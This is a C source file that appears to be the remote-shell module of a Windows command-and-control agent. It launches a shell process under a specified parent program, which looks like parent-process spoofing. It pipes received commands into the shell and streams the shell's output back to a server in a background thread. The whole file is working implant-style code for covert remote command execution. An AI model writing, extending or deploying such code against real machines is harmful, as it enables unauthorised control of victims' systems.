#include <Windows.h>
#include <winbase.h>
#include <stdint.h>
#include <stdio.h>
#include <processenv.h>
#include <namedpipeapi.h>
#include <fileapi.h>
#include <psapi.h>
#include <LM.h>
#include <sysinfoapi.h>
#include "cJSON.h"
#include "agent_shell.h"
#include "agent_session.h"
#include "agent_utility.h"
#include "agent_commands.h"
#include "agent_protocol.h"
#include "agent_config.h"
#include "agent_process.h"
#include "agent_thread.h"

uint32_t send_process_output(void* args) {
	program_run_info* info = (program_run_info*)args;
	session* sess = info->sess;
	packet* pck = info->pck;
	process_handle* proc = info->process_intercepted->process;

	message* msg = ZERO(message);
	uint32_t seq = 0;
	uint32_t dwRead = 0;
	char chBuf[4096] = { 0 };

	while (!sess->quit_shell) {
		// read the result
		bool bSuccess = ReadFile(
			proc->proc_stdout,
			chBuf,
			sizeof chBuf,
			&dwRead,
			ZERO(void)
		);

		if (dwRead > 0) {
			// send result to server			
			msg = message_create(sess);
			if (!msg) goto fail;
			if (!message_send_data_partial(sess, pck, (size_t)dwRead, (uint8_t*)chBuf)) goto fail;
		}
		memset(chBuf, 0, sizeof chBuf);
	}

	// send the closing packet 
	msg = message_create(sess);
	if (!msg) goto fail;
	if (!message_add_request_data(
		msg,
		0,
		ZERO(char),
		pck->id,
		seq,
		REQUEST_COMMANDDATA,
		PACKET_STATE_NO_MORE_PACKETS,
		true
	)) goto fail;
	if (!message_send(sess, msg)) goto fail;
	program_run_info_free(info);
	return ERROR_OK;

fail:
	program_run_info_free(info);
	return ERROR_UNKNOWN;
}

uint32_t shell_new(char* shell_program, char* parent_program, void* context, command_shell* shell) {
	uint32_t error = ERROR_UNKNOWN;
	if (!shell) goto fail;
	
	error = process_run(NULL, shell_program, parent_program, shell->proc);
	if (!shell->proc) goto fail;

	// create thread that send result to server
	shell->data = OBJ_ALLOC(void*);
	if (!shell->data) goto fail;

	program_run_info* info = (program_run_info*)context;
	shell->output_thread = session_start_thread(send_process_output, (void*)info, info->sess);
	if (!shell->output_thread) goto fail;	

	error = ERROR_OK;
	return error;

fail:
	shell_free(shell);
	return error;
}

bool shell_run(command_shell* shell, char* command) {
	char* completed_command = ZERO(char);

	// create full command
	uint32_t dwWritten = 0;
	bool bSuccess = false;
	completed_command = MEM_ALLOC(strlen(command) + 1);
	if (!completed_command) goto fail;
	memcpy(completed_command, command, strlen(command));

	// write the command
	bSuccess = WriteFile(
		shell->proc->proc_stdin,
		completed_command,
		strlen(completed_command),
		&dwWritten,
		ZERO(void)
	);
	if (!bSuccess) goto fail;
	FREE(completed_command);

	// check if the process still exists 
	// this check handle cases when the user typed "exit"
	uint32_t exitCode = 0;
	Sleep(300);
	GetExitCodeProcess((HANDLE)shell->proc->handle, (LPDWORD)&exitCode);
	if (exitCode != STILL_ACTIVE) {
		// process terminate, close shell
		if (!shell_free(shell)) goto fail;
	}

	return true;
fail:
	if (completed_command) FREE(completed_command);
	return false;
}

bool shell_free(command_shell* shell) {
	if (shell) {
		process_free(shell->proc, true);		
		if (shell->data) FREE(shell->data);
		FREE(shell);
		return true;
	}
	return false;
}